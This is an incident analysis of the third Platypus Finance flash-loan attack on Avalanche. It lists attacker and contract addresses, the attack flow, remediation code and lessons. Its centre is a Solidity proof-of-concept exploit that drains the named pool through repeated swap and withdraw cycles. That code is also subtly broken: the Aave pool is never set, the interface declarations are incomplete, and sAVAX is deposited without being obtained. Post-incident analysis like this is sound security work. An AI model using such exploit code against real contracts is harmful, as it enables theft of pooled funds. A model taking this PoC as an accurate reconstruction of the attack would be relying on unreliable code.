# Platypus Finance Third Flash Loan Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Platypus Finance (3rd attack) |
| Date | 2023-10-16 |
| Chain | Avalanche |
| Loss | ~$2,000,000 USD |
| Attack Type | Flash Loan + Repeated LP Swap Cycle |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x0cd4fd0eecd2c5ad24de7f17ae35f9db6ac51ee7` |
| Attack Contract | `0x44e251786a699518d6273ea1e027cec27b49d3bd` |
| Vulnerable Contract | `0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447` (Platypus Pool) |
| Fork Block | 36,346,397 |

## 2. Vulnerability Code Analysis

Platypus Finance is a stableswap AMM that supported swaps between WAVAX and sAVAX (Staked AVAX). By executing repeated deposit-swap-withdraw cycles, an attacker could induce cumulative precision loss and withdraw more assets than the actual value of the LP tokens deposited.

```solidity
// Vulnerable pattern: Repeated swap vulnerability in Platypus stableswap
contract PlatypusPool {
    // Coverage ratio-based price calculation
    function getSwapAmount(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) public view returns (uint256 amountOut) {
        uint256 coverageRatioIn = getCoverageRatio(tokenIn);
        uint256 coverageRatioOut = getCoverageRatio(tokenOut);
        // Swap profit possible due to asymmetric liquidity
        amountOut = _calculateSwapAmountWithSlippage(amountIn, coverageRatioIn, coverageRatioOut);
    }

    // Vulnerable: Repeated swaps cause coverage ratio imbalance
    function swap(address tokenFrom, address tokenTo, uint256 fromAmount, ...) external {
        uint256 toAmount = getSwapAmount(tokenFrom, tokenTo, fromAmount);
        IERC20(tokenFrom).transferFrom(msg.sender, address(this), fromAmount);
        IERC20(tokenTo).transfer(msg.sender, toAmount);
        // coverage ratio update - imbalance accumulates after repeated swaps
    }
}
```

**Vulnerability**: In Platypus's coverage ratio-based pricing model, depositing a large amount of WAVAX and repeatedly swapping between SAVAX↔WAVAX skews the coverage ratio. Withdrawing LP in this state allowed the attacker to recover more WAVAX than was originally deposited.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Repeated LP Swap Cycle
// Unverified source code — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x0cd4fd0eecd2c5ad24de7f17ae35f9db6ac51ee7]
  │
  ├─1─▶ Aave V3.flashLoan(WAVAX, large amount)
  │      [WAVAX: 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7]
  │
  ├─2─▶ PlatypusPool.deposit(WAVAX, amount)
  │      [Platypus Pool: 0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447]
  │      [LP_AVAX: 0xC73eeD4494382093C6a7C284426A9a00f6C79939]
  │      Acquire WAVAX LP
  │
  ├─3─▶ PlatypusPool.deposit(SAVAX, amount)
  │      [SAVAX: 0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE]
  │      [LP_sAVAX: 0xA2A7EE49750Ff12bb60b407da2531dB3c50A1789]
  │      Acquire sAVAX LP
  │
  ├─4─▶ Repeated swap cycle:
  │      swap(sAVAX → WAVAX) × N times
  │      withdraw(WAVAX LP) × N times
  │      swap(WAVAX → sAVAX) × N times
  │      withdraw(WAVAX LP) × N times
  │      swap(sAVAX → WAVAX) × N times
  │      withdraw(WAVAX LP) × N times
  │
  ├─5─▶ PlatypusPool.withdraw(sAVAX LP)
  │      Full withdrawal of sAVAX LP
  │
  └─6─▶ Repay Aave V3 flash loan + realize ~$2M profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external returns (uint256);
    function swap(address fromToken, address toToken, uint256 fromAmount, uint256 minimumToAmount, address to, uint256 deadline) external returns (uint256, uint256);
}

interface IAaveFlashloan {
    function flashLoan(address receiver, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
}

contract Platypus03Exploit {
    IPlatypusPool pool = IPlatypusPool(0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447);
    IAaveFlashloan aaveV3;
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 SAVAX = IERC20(0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE);
    IERC20 LP_AVAX = IERC20(0xC73eeD4494382093C6a7C284426A9a00f6C79939);
    IERC20 LP_sAVAX = IERC20(0xA2A7EE49750Ff12bb60b407da2531dB3c50A1789);

    function testExploit() external {
        address[] memory assets = new address[](1);
        assets[0] = address(WAVAX);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1_000_000e18;

        aaveV3.flashLoan(address(this), assets, amounts, new uint256[](1), address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        // Acquire WAVAX and SAVAX LP
        WAVAX.approve(address(pool), type(uint256).max);
        SAVAX.approve(address(pool), type(uint256).max);
        pool.deposit(address(WAVAX), amounts[0] / 2, address(this), block.timestamp);
        pool.deposit(address(SAVAX), SAVAX.balanceOf(address(this)), address(this), block.timestamp);

        // Manipulate coverage ratio via repeated swap cycle
        for (uint i = 0; i < 5; i++) {
            pool.swap(address(SAVAX), address(WAVAX), SAVAX.balanceOf(address(this)), 0, address(this), block.timestamp);
            uint256 lpBalance = LP_AVAX.balanceOf(address(this));
            if (lpBalance > 0) {
                LP_AVAX.approve(address(pool), lpBalance);
                pool.withdraw(address(WAVAX), lpBalance, 0, address(this), block.timestamp);
            }
            pool.swap(address(WAVAX), address(SAVAX), WAVAX.balanceOf(address(this)) / 2, 0, address(this), block.timestamp);
        }

        // Final withdrawal of sAVAX LP
        uint256 sAvaxLP = LP_sAVAX.balanceOf(address(this));
        LP_sAVAX.approve(address(pool), sAvaxLP);
        pool.withdraw(address(SAVAX), sAvaxLP, 0, address(this), block.timestamp);

        // Repay Aave
        WAVAX.approve(address(aaveV3), amounts[0] + premiums[0]);
        return true;
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Coverage ratio imbalance, LP value manipulation via repeated swaps |
| Impact Scope | Platypus WAVAX-sAVAX pool |
| Explorer | [Snowtrace](https://snowtrace.io/address/0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447) |

## 6. Security Recommendations

```solidity
// Remediation 1: Prohibit deposit/withdrawal within the same block
mapping(address => uint256) public lastDepositBlock;

function withdraw(address token, uint256 liquidity, ...) external {
    require(block.number > lastDepositBlock[msg.sender], "Cannot withdraw in deposit block");
    // ...
}

// Remediation 2: Coverage ratio change threshold
function swap(address fromToken, address toToken, uint256 fromAmount, ...) external {
    uint256 coverageBefore = getCoverageRatio(toToken);
    // Execute swap...
    uint256 coverageAfter = getCoverageRatio(toToken);

    // Revert if coverage ratio changes significantly
    require(
        coverageAfter >= coverageBefore * 90 / 100,
        "Coverage ratio deviation too high"
    );
}

// Remediation 3: Rate-limit repeated swaps
mapping(address => uint256) public lastSwapBlock;
mapping(address => uint256) public swapCountInBlock;

function swap(...) external {
    if (lastSwapBlock[msg.sender] == block.number) {
        swapCountInBlock[msg.sender]++;
        require(swapCountInBlock[msg.sender] <= 3, "Too many swaps in one block");
    } else {
        lastSwapBlock[msg.sender] = block.number;
        swapCountInBlock[msg.sender] = 1;
    }
    // ...
}
```

## 7. Lessons Learned

1. **Platypus's Susceptibility to Repeated Attacks**: Platypus suffered its third attack in 2023. The fact that the same protocol was exploited repeatedly indicates that the fundamental design flaw was never resolved.
2. **Vulnerability of Coverage Ratio-Based Swaps**: Stableswap AMMs that use a coverage ratio create arbitrage opportunities through repeated swaps under asymmetric liquidity conditions. This mechanism must account for flash loan attack scenarios at the design stage.
3. **Avalanche DeFi**: Large-scale flash loans are available via Aave V3 on the Avalanche chain, enabling repeated attacks against native Avalanche protocols.
4. **LST (Liquid Staking Token) Pool Vulnerability**: Pools pairing LSTs such as sAVAX and stETH with their underlying assets are particularly vulnerable to manipulation of the exchange ratio between the two assets. Preventing repeated swaps is essential.